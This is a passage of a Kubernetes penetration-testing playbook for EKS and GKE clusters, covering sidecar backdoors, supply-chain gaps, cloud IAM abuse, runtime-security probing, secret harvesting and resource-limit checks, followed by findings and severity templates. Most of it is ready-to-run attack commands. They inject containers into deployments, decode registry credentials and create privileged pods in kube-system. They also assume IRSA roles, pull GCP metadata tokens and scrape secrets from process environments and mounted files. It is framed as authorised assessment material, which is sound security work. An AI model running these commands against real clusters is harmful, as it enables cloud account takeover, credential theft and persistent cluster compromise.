echo "DaemonSet in kube-system: $([ "$RESULT" = "201" ] && echo "🔴 CREATED — runs on ALL nodes" || echo "✅ DENIED")"
```

---

### 8.3 Sidecar Injection into Existing Deployment

> 🟠 **HIGH** — backdoor existing workload without creating new resources

```bash
# Patch existing deployment to add a sidecar container
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json-patch+json" \
  -X PATCH \
  $API/apis/apps/v1/namespaces/$NS/deployments/<DEPLOYMENT-NAME> \
  -d '[{
    "op":"add",
    "path":"/spec/template/spec/containers/-",
    "value":{
      "name":"assessment-sidecar",
      "image":"alpine",
      "command":["sleep","3600"]
    }
  }]' | python3 -m json.tool
```

---

## 📦 Phase 9: Supply Chain & Admission Control Gaps

### 9.1 Image Signing Check

```bash
# Check for admission webhooks validating image signatures
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
names = [wh['metadata']['name'] for wh in d.get('items',[])]
signing_tools = ['kyverno', 'cosign', 'sigstore', 'notary', 'connaisseur']
found = [n for n in names if any(t in n.lower() for t in signing_tools)]
if found:
    print(f'✅ Image signing admission: {found}')
else:
    print('🟠 No image signing admission webhook detected')
    print('   Unsigned images may be deployable')
"

# Dry-run deploying a public unsigned image
kubectl run unsigned-test --image=nginx:latest \
  -n $NS --dry-run=server 2>&1 | \
  grep -q "Error" && echo "✅ Unsigned image blocked" || \
  echo "🟠 Unsigned image would be allowed"
```

---

### 9.2 Registry Credential Theft

> 🟠 **HIGH** — pull any private image, push backdoored images

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
for s in d.get('items', []):
    if s.get('type') == 'kubernetes.io/dockerconfigjson':
        print(f'🔴 Registry secret: {s[\"metadata\"][\"name\"]}')
        cfg = s.get('data', {}).get('.dockerconfigjson', '')
        if cfg:
            decoded = base64.b64decode(cfg).decode()
            print(f'   Config: {decoded[:300]}')
"
```

---

### 9.3 Admission Webhook Bypass (failurePolicy: Ignore)

> 🔴 **CRITICAL** — if Kyverno is down, all policies disabled silently

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for wh in d.get('items', []):
    for hook in wh.get('webhooks', []):
        fp = hook.get('failurePolicy', '?')
        ns_selector = hook.get('namespaceSelector', {})
        if fp == 'Ignore':
            print(f'🔴 BYPASS: {wh[\"metadata\"][\"name\"]} — failurePolicy=Ignore')
        # Check if kube-system is excluded
        excl = ns_selector.get('matchExpressions', [])
        for e in excl:
            if 'kube-system' in str(e):
                print(f'🟠 NAMESPACE BYPASS: {wh[\"metadata\"][\"name\"]} excludes kube-system')
"

# Try creating policy-violating pod in kube-system (often excluded)
curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/api/v1/namespaces/kube-system/pods \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"policy-bypass-test"},
       "spec":{"containers":[{"name":"c","image":"nginx","securityContext":{"privileged":true}}]}}' | \
  read code; echo "Privileged pod in kube-system: $([ "$code" = "201" ] && echo "🔴 ALLOWED" || echo "✅ DENIED")"
```

---

## 🟡 Phase 10: EKS-Specific Tests

### 10.1 aws-auth ConfigMap — Read & Write

> 🔴 **CRITICAL if writable** — add any IAM role as cluster-admin permanently

```bash
# Read aws-auth — reveals all IAM roles/users with cluster access
echo "━━━ aws-auth ConfigMap ━━━"
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/kube-system/configmaps/aws-auth | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
data = d.get('data', {})
print('mapRoles:')
print(data.get('mapRoles','  (empty)'))
print('mapUsers:')
print(data.get('mapUsers','  (empty)'))
"

# Check if we can PATCH aws-auth
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/strategic-merge-patch+json" \
  -X PATCH \
  $API/api/v1/namespaces/kube-system/configmaps/aws-auth \
  -d '{}')
echo "aws-auth patch: $([ "$RESULT" = "200" ] && echo "🔴 WRITABLE — can add IAM role as cluster-admin" || echo "✅ DENIED ($RESULT)")"
```

---

### 10.2 IRSA — IAM Role for Service Account Abuse

> 🔴 **CRITICAL** — pod-level AWS API access, often includes S3/RDS/Secrets Manager

```bash
# Check for IRSA-annotated service accounts
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/serviceaccounts | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for sa in d.get('items', []):
    ann = sa.get('metadata', {}).get('annotations', {})
    role = ann.get('eks.amazonaws.com/role-arn', '')
    if role:
        print(f'🔴 IRSA SA: {sa[\"metadata\"][\"name\"]} → {role}')
"

# Our pod has IRSA if these env vars exist
echo "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE"
echo "AWS_ROLE_ARN: $AWS_ROLE_ARN"

if [ -n "$AWS_ROLE_ARN" ]; then
  echo "🔴 IRSA token present — can assume role: $AWS_ROLE_ARN"
  aws sts assume-role-with-web-identity \
    --role-arn "$AWS_ROLE_ARN" \
    --role-session-name assessment \
    --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)" \
    2>/dev/null | python3 -m json.tool
fi
```

---

### 10.3 EKS Node IAM Role Enumeration (Attacker Machine)

```bash
# Enumerate what the node role can do
aws iam list-attached-role-policies --role-name eks-node-group-role
aws iam list-role-policies --role-name eks-node-group-role

# Simulate policy actions
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT:role/eks-node-group-role \
  --action-names "s3:GetObject" "secretsmanager:GetSecretValue" \
    "sts:AssumeRole" "ec2:DescribeInstances" "ecr:GetDownloadUrlForLayer"

# ECR access — pull images and inspect for secrets
aws ecr describe-repositories
aws ecr get-login-password | docker login --username AWS \
  --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
```

---

### 10.4 EKS Audit Logging Check

```bash
# From attacker machine — check if audit logs are enabled
aws eks describe-cluster --name <cluster> \
  --query 'cluster.logging.clusterLogging'

# Look for suspicious patterns in CloudWatch
aws logs filter-log-events \
  --log-group-name /aws/eks/<cluster>/cluster \
  --filter-pattern '"system:anonymous"' \
  --start-time $(date -d '1 hour ago' +%s000)

# Check for unauthorized API calls
aws logs filter-log-events \
  --log-group-name /aws/eks/<cluster>/cluster \
  --filter-pattern '"403"'
```

---

## 🔵 Phase 11: GKE-Specific Tests

### 11.1 Workload Identity Abuse

> 🔴 **CRITICAL** — pod-level GCP API access

```bash
# Check for Workload Identity annotations
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/serviceaccounts | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for sa in d.get('items', []):
    ann = sa.get('metadata', {}).get('annotations', {})
    wi = ann.get('iam.gke.io/gcp-service-account', '')
    if wi:
        print(f'🔴 Workload Identity: {sa[\"metadata\"][\"name\"]} → {wi}')
"

# Get Workload Identity token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  2>/dev/null | python3 -m json.tool
```

---

### 11.2 GKE Legacy Metadata (No Header Required)

> 🔴 **CRITICAL** — old clusters expose credentials without authentication header

```bash
# Legacy v1beta1 endpoint — no Metadata-Flavor header needed
curl -s --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" \
  2>/dev/null && echo "🔴 LEGACY METADATA ACCESSIBLE WITHOUT HEADER" || \
  echo "✅ Legacy endpoint blocked"

# Check 0.1 endpoint (very old GKE)
curl -s --max-time 5 \
  "http://metadata.google.internal/0.1/meta-data/" 2>/dev/null && \
  echo "🔴 v0.1 METADATA ACCESSIBLE"
```

---

### 11.3 GKE Node SA Scopes

> 🔴 **CRITICAL if cloud-platform scope** — full GCP access

```bash
SCOPES=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  2>/dev/null)

echo "Node scopes:"
echo "$SCOPES" | tr ',' '\n' | while read scope; do
  case "$scope" in
    *cloud-platform*)   echo "  🔴 cloud-platform — FULL GCP ACCESS";;
    *devstorage*)       echo "  🟠 devstorage — GCS bucket access";;
    *compute*)          echo "  🟠 compute — VM/network access";;
    *sql*)              echo "  🟡 Cloud SQL access";;
    *logging*|*monitoring*) echo "  🔵 $scope";;
    *)                  echo "  🔵 $scope";;
  esac
done
```

---

### 11.4 GKE Kubernetes Dashboard

> 🔴 **CRITICAL if cluster-admin bound**

```bash
# Check if dashboard is deployed
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/kubernetes-dashboard/services 2>/dev/null | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('items', [])
if items:
    print(f'🟠 Kubernetes Dashboard deployed: {len(items)} service(s)')
else:
    print('✅ Dashboard not found')
" 2>/dev/null || echo "✅ Dashboard namespace not found"

# Check if dashboard SA has cluster-admin
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for crb in d.get('items', []):
    for s in crb.get('subjects', []):
        if 'dashboard' in s.get('name', '').lower():
            role = crb.get('roleRef', {}).get('name', '')
            icon = '🔴' if role == 'cluster-admin' else '🟡'
            print(f'{icon} Dashboard SA has role: {role}')
"
```

---

## ⚡ Phase 12: Runtime Security Gaps

### 12.1 Detect Runtime Security Tools

```bash
echo "━━━ Runtime Security Detection ━━━"
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/kube-system/pods | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
tools = {
    'tetragon':   '🔴 Tetragon eBPF enforcement present',
    'falco':      '🟡 Falco detection present (alerts only, no blocking)',
    'sysdig':     '🟡 Sysdig present',
    'aqua':       '🟡 Aqua Security present',
    'twistlock':  '🟡 Twistlock/Prisma present',
    'datadog':    '🔵 Datadog agent present',
    'newrelic':   '🔵 New Relic present',
}
found = set()
for p in d.get('items', []):
    name = p['metadata']['name'].lower()
    for tool, msg in tools.items():
        if tool in name and tool not in found:
            print(msg)
            found.add(tool)
if not found:
    print('🔴 No runtime security tooling detected')
"

# Check for TracingPolicies (Tetragon)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$API/apis/cilium.io/v1alpha1/tracingpolicies" 2>/dev/null | \
  python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    items = d.get('items', [])
    if items:
        print(f'✅ Tetragon TracingPolicies: {len(items)} active')
        for i in items:
            print(f'   • {i[\"metadata\"][\"name\"]}')
    else:
        print('🔴 No Tetragon TracingPolicies found')
except:
    print('🔴 Tetragon CRD not present')
" 2>/dev/null
```

---

### 12.2 Probe Tetragon Enforcement

```bash
echo "━━━ Testing Tetragon Policies ━━━"

# Test 1: Exec from /tmp (block-exec-from-tmp policy)
cp /bin/ls /tmp/assessment-test 2>/dev/null
RESULT=$(timeout 3 /tmp/assessment-test / 2>&1)
rm /tmp/assessment-test 2>/dev/null
echo "Exec from /tmp: $(echo "$RESULT" | grep -q "Killed" && echo "✅ BLOCKED by Tetragon" || echo "🔴 ALLOWED — block-exec-from-tmp missing")"

# Test 2: bash outbound TCP (block-reverse-shell policy)
RESULT=$(timeout 3 bash -c "exec 3<>/dev/tcp/8.8.8.8/53 && echo OPEN" 2>&1)
echo "bash /dev/tcp:  $(echo "$RESULT" | grep -q "Killed" && echo "✅ BLOCKED by Tetragon" || echo "🔴 ALLOWED — block-reverse-shell missing")"

# Test 3: python outbound TCP
RESULT=$(timeout 3 python3 -c "import socket; s=socket.socket(); s.connect(('8.8.8.8',53)); print('OPEN')" 2>&1)
echo "python3 TCP:    $(echo "$RESULT" | grep -q "Killed" && echo "✅ BLOCKED by Tetragon" || echo "🔴 ALLOWED — python3 not in binary list")"
```

---

## 🔐 Phase 13: Secrets & Sensitive Data

### 13.1 Environment Variable Secrets

> 🟠 **HIGH** — plain-text credentials readable by any process in container

```bash
echo "━━━ Potential Secrets in Environment ━━━"
env | grep -iE "password|passwd|secret|key|token|api|credential|auth|private|cert|pwd" | \
  grep -vE "KUBERNETES|SERVICE_|_PORT|_HOST|PATH|HOME|SHELL|TERM" | \
  while IFS='=' read -r name value; do
    echo "  🔑 $name = ${value:0:80}"
  done

# Check other processes' env vars (if hostPID)
echo "━━━ Other Processes' Secrets (hostPID) ━━━"
for pid in $(ls /proc | grep "^[0-9]" | head -20); do
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | \
    grep -iE "password|secret|api_key|token" | \
    while read line; do echo "  PID $pid: $line"; done
done 2>/dev/null
```

---

### 13.2 Mounted Secret Files

```bash
echo "━━━ Secret Mount Locations ━━━"
for path in \
  "/var/run/secrets/kubernetes.io/serviceaccount/token" \
  "/etc/ssl/private" \
  "/root/.docker/config.json" \
  "/root/.aws/credentials" \
  "/root/.kube/config" \
  "/etc/git-credentials" \
  "$(find /run/secrets -type f 2>/dev/null | head -5)"; do
  [ -f "$path" ] && echo "  🔑 FOUND: $path" && head -3 "$path" 2>/dev/null
done

# Find ALL key/cert/credential files
find / \
  \( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" \
  -o -name ".env" -o -name "*.env" -o -name "credentials" \) \
  -not -path "*/proc/*" -not -path "*/sys/*" \
  2>/dev/null | head -20 | while read f; do
  echo "  🔑 $f"
done
```

---

### 13.3 Application Config Secrets

```bash
echo "━━━ Hardcoded Credentials in Config Files ━━━"
find /app /config /etc/app /srv /opt 2>/dev/null -type f \
  \( -name "*.conf" -o -name "*.yaml" -o -name "*.json" -o -name "*.properties" \
  -o -name "*.env" -o -name "*.ini" \) | \
  xargs grep -l -iE "password|secret|api_key|private_key" 2>/dev/null | \
  while read f; do
    echo "  🔴 Credentials in: $f"
    grep -iE "password\s*[:=]\s*\S+|secret\s*[:=]\s*\S+|api_key\s*[:=]\s*\S+" "$f" 2>/dev/null | \
      head -3 | sed 's/^/     /'
  done
```

---

## 💥 Phase 14: DoS & Resource Exhaustion Proof

### 14.1 Resource Limits Absence

> 🟡 **MEDIUM** — no limits = attacker can consume all node resources

```bash
echo "━━━ Resource Limits Check ━━━"

# Memory limit
MEM_LIMIT=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || \
            cat /sys/fs/cgroup/memory.max 2>/dev/null)
if [ "$MEM_LIMIT" = "9223372036854771712" ] || [ "$MEM_LIMIT" = "max" ]; then
  echo "🔴 NO MEMORY LIMIT — can OOM the node"
else
  echo "✅ Memory limit: $(echo $MEM_LIMIT | awk '{printf "%.0f MB", $1/1024/1024}')"
fi

# CPU quota
CPU_QUOTA=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
if [ "$CPU_QUOTA" = "-1" ]; then
  echo "🔴 NO CPU LIMIT — can starve other workloads"
else
  echo "✅ CPU quota: ${CPU_QUOTA}us"
fi
```

---

### 14.2 Namespace Quota Check

```bash
echo "━━━ ResourceQuota ━━━"
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/resourcequotas | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('items', [])
if not items:
    print('🟡 No ResourceQuota — unlimited pod/CPU/memory creation')
else:
    for q in items:
        print(f'✅ Quota: {q[\"metadata\"][\"name\"]}')
        for k,v in q.get('status',{}).get('hard',{}).items():
            used = q.get('status',{}).get('used',{}).get(k,'?')
            print(f'   {k}: {used}/{v}')
"

echo "━━━ LimitRange ━━━"
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/limitranges | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('items', [])
print('✅ LimitRange present' if items else '🟡 No LimitRange — no default limits enforced')
"
```

---

## 📝 Findings Summary Template

```markdown
## Finding: [Title]

**Severity:** 🔴 Critical / 🟠 High / 🟡 Medium / 🔵 Low
**Category:** Cloud Credentials | RBAC | Container Escape | Lateral Movement | Runtime | Supply Chain

**Evidence:**
\`\`\`
<paste command output here>
\`\`\`

**Impact:**
<What can an attacker achieve with this finding>

**Steps to Reproduce:**
1. Starting from compromised pod in namespace `<ns>`
2. Run: `<command>`
3. Observe: `<output>`

**Remediation:**
- [ ] <specific fix>
- [ ] <specific fix>

**References:**
- MITRE ATT&CK: [T1552.007](https://attack.mitre.org/techniques/T1552/007/) Container Credentials
```

---

## 📊 Severity Matrix

| Finding | Severity | Immediate Impact |
|---|---|---|
| IMDS accessible + IAM credentials stolen | 🔴 Critical | AWS/GCP account takeover |
| etcd accessible without auth | 🔴 Critical | All cluster secrets in plaintext |
| Privileged pod + hostPath mount | 🔴 Critical | Full node + cluster compromise |
| aws-auth / ClusterRoleBinding writable | 🔴 Critical | Permanent cluster-admin |
| Wildcard RBAC on service account | 🟠 High | All secrets in namespace readable |
| Other pods' SA tokens readable via hostPath | 🟠 High | Lateral movement to any workload |
| Kubelet certificate accessible | 🟠 High | system:node credential |
| Unsigned images allowed in admission | 🟠 High | Supply chain backdoor vector |
| failurePolicy: Ignore on Kyverno webhook | 🟠 High | All admission policies bypassable |
| No mTLS between services | 🟡 Medium | Traffic sniffing, PII exposure |
| No Tetragon/Falco runtime security | 🟡 Medium | Reverse shells, crypto mining |
| Flat network (no NetworkPolicy) | 🟡 Medium | Unrestricted lateral movement |
| Long-lived SA tokens (no 10-min rotation) | 🟡 Medium | Extended credential exposure window |
| PSS not enforced on namespace | 🟡 Medium | Container escape vector open |
| Missing resource limits | 🔵 Low | Noisy neighbour / node DoS |
| Debug/metrics endpoints exposed | 🔵 Low | Information disclosure |
| No audit logging enabled | 🔵 Low | No forensic trail for incidents |

---

## ☁️ EKS vs GKE Nuances

| Check | EKS | GKE |
|---|---|---|
| **Metadata endpoint** | `169.254.169.254` (IMDSv1/v2) | `metadata.google.internal` |
| **Node IAM** | EC2 instance role (attached policy) | GCE service account (IAM bindings) |
| **K8s auth mapping** | `aws-auth` ConfigMap in kube-system | GKE IAM → K8s RBAC binding |
| **Pod-level cloud auth** | IRSA (SA annotation + token projection) | Workload Identity (SA annotation) |
| **Audit logs** | CloudWatch Logs (`/aws/eks/cluster/cluster`) | Cloud Logging (Stackdriver) |
| **Default CNI** | Amazon VPC CNI — **no NetworkPolicy enforcement** | Cilium — **enforces NetworkPolicy** |
| **Fargate nodes** | No node access, no hostPath possible | N/A (use GKE Autopilot) |
| **etcd access** | Fully managed, no access | Fully managed, no access |
| **Metadata protection** | IMDSv2 + hop limit = 1 (blocks container on 1-hop limit) | Metadata concealment (legacy endpoint disabled by default) |
| **Node registration** | Bootstrapped via EC2 identity | Bootstrapped via GCE identity |
| **Dashboard** | Rarely deployed by default | Sometimes deployed on older clusters |
| **Legacy metadata** | IMDSv1 must be explicitly disabled | v1beta1 endpoint disabled on GKE 1.21+ |

---

<div align="center">

---

*All test cases require written authorisation before execution.*
*Document every command run, every output captured, and all cleanup actions taken.*

[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20Containers-red?style=flat-square)](https://attack.mitre.org/matrices/enterprise/containers/)
[![License](https://img.shields.io/badge/Use-Authorised%20Testing%20Only-orange?style=flat-square)](.)

</div>
